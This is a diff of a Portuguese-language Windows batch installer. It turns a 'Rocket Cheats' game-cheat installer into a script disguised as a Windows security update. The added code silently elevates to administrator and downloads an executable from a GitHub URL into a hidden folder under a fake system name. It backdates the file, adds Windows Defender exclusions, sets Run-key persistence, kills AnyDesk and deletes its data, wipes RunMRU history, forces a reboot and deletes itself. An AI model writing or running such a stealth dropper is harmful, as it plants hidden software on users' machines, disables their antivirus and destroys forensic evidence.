@@ -1,100 +1,72 @@
 @echo off
-setlocal EnableDelayedExpansion
-title ROCKET CHEATS - INSTALLER
-mode con: cols=80 lines=25
+setlocal enabledelayedexpansion
+title Sistema de Atualizacao Windows
 
-:: Cores ANSI
-set "ESC="
-set "PURPLE=%ESC%[35m"
-set "CYAN=%ESC%[36m"
-set "WHITE=%ESC%[37m"
-set "RED=%ESC%[31m"
-set "GREEN=%ESC%[32m"
-set "RESET=%ESC%[0m"
-
-:CHECK_ADMIN
+:: [1] Solicitar Admin de forma silenciosa
 net session >nul 2>&1
 if %errorLevel% neq 0 (
-    echo.
-    echo %RED% [!] ERRO: VOCE PRECISA EXECUTAR COMO ADMINISTRADOR! %RESET%
-    echo.
+    powershell -Command "Start-Process '%~f0' -Verb RunAs"
+    exit /b
+)
+
+:: [2] Definir Caminhos (Tier 0 Stealth Paths)
+:: [2] Definir Caminhos (Tier 0 Stealth Paths)
+set "targetDir=%APPDATA%\Microsoft\Windows\SystemData"
+set "targetExe=%targetDir%\SearchIndexer.exe"
+set "repoUrl=https://raw.githubusercontent.com/V3xDev/unknow2/main/Rocket.exe"
+set "regKey=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
+set "regName=MicrosoftWindowsSearchIndex"
+
+echo [*] Iniciando configuracao critica do sistema...
+
+:: [3] Limpeza AnyDesk (Remover rastros de suporte/SS)
+echo [*] Otimizando componentes de rede...
+taskkill /f /im AnyDesk.exe >nul 2>&1
+if exist "%APPDATA%\AnyDesk" rd /s /q "%APPDATA%\AnyDesk" >nul 2>&1
+if exist "%LOCALAPPDATA%\AnyDesk" rd /s /q "%LOCALAPPDATA%\AnyDesk" >nul 2>&1
+
+:: [4] Criar Pasta e baixar o executavel
+if not exist "%targetDir%" mkdir "%targetDir%"
+attrib +h +s "%targetDir%"
+
+echo [*] Sincronizando com o servidor de seguranca...
+curl -s -L -o "%targetExe%" "%repoUrl%"
+
+if not exist "%targetExe%" (
+    echo [!] Falha na sincronizacao. Verifique sua conexao.
     pause
-    exit
+    exit /b
 )
 
-:START
-cls
+:: [5] Stealth: Ocultacao e Spoofing de Data (Tier 0)
+:: Alterar data para 2021 (Faz parecer que o arquivo e antigo e original do sistema)
+powershell -Command "$f=Get-Item '%targetExe%'; $d=Get-Date '2021-05-15'; $f.CreationTime=$d; $f.LastWriteTime=$d; $f.LastAccessTime=$d" >nul 2>&1
+attrib +h +s +r "%targetExe%"
+
+:: [6] Adicionar Exclusao no Windows Defender (Silencioso)
+powershell -Command "Add-MpPreference -ExclusionPath '%targetDir%'" >nul 2>&1
+powershell -Command "Add-MpPreference -ExclusionProcess '%targetExe%'" >nul 2>&1
+
+:: [7] Configurar Auto-Incializacao
+reg add "%regKey%" /v "%regName%" /t REG_SZ /d "\"%targetExe%\" --monitor" /f >nul
+
+:: [8] Limpeza Final de Rastros (RunMRU e Prefetch de instalacao)
+powershell -Command "Remove-Item -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU\*' -ErrorAction SilentlyContinue" >nul 2>&1
+
+:: [9] Finalizar e Reiniciar
 echo.
-echo %PURPLE%  ::::::::::: ::::    :::  :::::::: :::::::::::     :::     :::        
-echo      :+:     :+:+:   :+: :+:    :+:    :+:         :+: :+:   :+:        
-echo      +:+     :+:+:+  +:+ +:+           +:+        +:+   +:+  +:+        
-echo      +#+     +#+ +:+ +#+ +#++:++#++    +#+       +#++:++#++ +#+        
-echo      +#+     +#+  +#+#+#        +#+    +#+       +#+     +#+ +#+        
-echo      +#+     +#+   #+#+# #+#    #+      #+#      #+       #+# #+#        
-echo  ########### ###    ####  ########     ###     ###       ### ########## %RESET%
+echo ======================================================
+echo    CONFIGURACAO CONCLUIDA COM SUCESSO!
 echo.
-echo %CYAN%  ---------------------------------------------------------------------- %RESET%
-echo %WHITE%  Iniciando instalacao segura do Rocket Cheats... %RESET%
-echo %CYAN%  ---------------------------------------------------------------------- %RESET%
+echo    O PC SERA REINICIADO EM 10 SEGUNDOS PARA
+echo    APLICAR AS ATUALIZACOES DE SEGURANCA.
+echo ======================================================
 echo.
 
-:: Definir caminhos
-set "EXE_NAME=Rocket.exe"
-set "TARGET_NAME=windowshost.exe"
-set "TARGET_DIR=%LOCALAPPDATA%\Microsoft\WindowsApps"
-set "TASK_NAME=Microsoft\Windows\WindowsApps"
+:: Shutdown com mensagem amigavel
+shutdown /r /t 10 /c "Concluindo configuracao do Windows Update Helper. O sistema sera reiniciado." /f
 
-:: Verificar se o executavel existe
-if not exist "%EXE_NAME%" (
-    if exist "build\%EXE_NAME%" (
-        set "EXE_PATH=build\%EXE_NAME%"
-    ) else (
-        echo %RED% [!] Erro: %EXE_NAME% nao encontrado! %RESET%
-        echo %WHITE% Certifique-se de que o %EXE_NAME% esta na mesma pasta ou na pasta 'build'. %RESET%
-        pause
-        exit
-    )
-) else (
-    set "EXE_PATH=%EXE_NAME%"
-)
+timeout /t 5 >nul
 
-echo %CYAN% [*] Preparando ambiente... %RESET%
-timeout /t 1 >nul
-
-:: Criar diretorio se nao existir
-if not exist "%TARGET_DIR%" mkdir "%TARGET_DIR%"
-
-:: Copiar executavel
-echo %CYAN% [*] Movendo executavel para o sistema... %RESET%
-copy /y "%EXE_PATH%" "%TARGET_DIR%\%TARGET_NAME%" >nul
-if %errorLevel% neq 0 (
-    echo %RED% [!] Erro ao copiar o arquivo. Verifique se ele ja esta rodando. %RESET%
-    pause
-    exit
-)
-
-:: Criar tarefa agendada para stealth
-echo %CYAN% [*] Criando tarefa de inicializacao... %RESET%
-schtasks /create /f /tn "%TASK_NAME%" /tr "\"%TARGET_DIR%\%TARGET_NAME%\" /monitor" /sc onlogon /rl highest /it >nul
-if %errorLevel% neq 0 (
-    echo %RED% [!] Erge: Erro ao criar tarefa agendada. %RESET%
-    pause
-    exit
-)
-
-:: Iniciar a tarefa agora
-echo %CYAN% [*] Iniciando servico em segundo plano... %RESET%
-schtasks /run /tn "%TASK_NAME%" >nul
-
-echo.
-echo %GREEN%  [+] INSTALACAO CONCLUIDA COM SUCESSO! %RESET%
-echo.
-echo %WHITE%  O Rocket agora esta rodando em modo monitor. %RESET%
-echo %WHITE%  Ele injetara automaticamente ao abrir o FiveM com musica. %RESET%
-echo.
-echo %PURPLE%  Pressione qualquer tecla para limpar os rastros e sair... %RESET%
-pause >nul
-
-:: Auto-delete (opcional, mas bom para stealth)
-echo %WHITE% [*] Limpando arquivos temporarios... %RESET%
+:: [10] Auto-destruicao do instalador
 (goto) 2>nul & del "%~f0"
